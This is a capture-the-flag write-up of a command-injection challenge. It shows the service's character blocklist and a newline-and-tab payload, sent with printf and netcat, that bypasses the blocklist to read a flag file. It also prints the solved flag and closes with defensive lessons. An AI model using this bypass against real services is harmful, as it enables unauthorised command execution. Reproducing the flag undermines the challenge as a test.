# Nidavellir (400 pts - MISC)

## Challenge Description
> Long ago in Nidavellir, where molten rivers fuel the dwarven forges, the craftsmen built a strange device for Thor himself. It was meant to test cunning rather than strength — an ancient terminal called the Echo Forge. The rules are simple and deceptive. Whatever command a traveller enters is immediately echoed back, unaltered and unfiltered, by the ancient mechanism.

**Server:** `nc challenges2.perfectroot.wiki 9009`

## TL;DR
Command injection via newline characters with tab-separated arguments, bypassing character blocklist to execute shell commands.

## Initial Analysis
Connected to the service and received a Python script (`script.py`) showing:
- Input sanitization with blocklist: `space`, `>`, `` ` ``, `;`, `{`, `/`, `&`, `|`, `"`, `$`
- User input inserted into: `echo {user_input}`
- Commands executed in `/bin/sh` shell

**Key Insight:** Newlines (`\n`) and tabs (`\t`) were NOT blocked!

## Solution

### Step 1: Identify the Vulnerability
The sanitization function blocked common command injection characters but missed:
- **Newlines** - Allow multi-line commands
- **Tabs** - Can replace spaces

### Step 2: Craft the Payload
```python
payload = "dummy\ncd\t..\ncd\t..\ncd\t..\ncat\tflag.txt"
```

This executes:
```bash
echo dummy
cd  ..      # Navigate up from /usr/src/app
cd  ..      # Navigate up from /usr/src
cd  ..      # Navigate up from /usr (now at /)
cat flag.txt  # Read the flag
```

### Step 3: Execute
```bash
printf 'dummy\ncd\t..\ncd\t..\ncd\t..\ncat\tflag.txt\n' | nc challenges2.perfectroot.wiki 9009
```

## Flag
```
r00t{wh15p3r5_0f_7h3_3ch0_4rg3_2b26a1c7}
```

## Key Takeaways
- **Blocklists are dangerous** - Missing just one character (newline) breaks the entire security model
- **Whitespace alternatives** - Tabs can replace spaces in many contexts
- **Defense:** Use allowlists, properly quote variables in shell commands, or avoid shell execution entirely

## Tools Used
- `nc` (netcat)
- Python for scripting
- `printf` for payload delivery
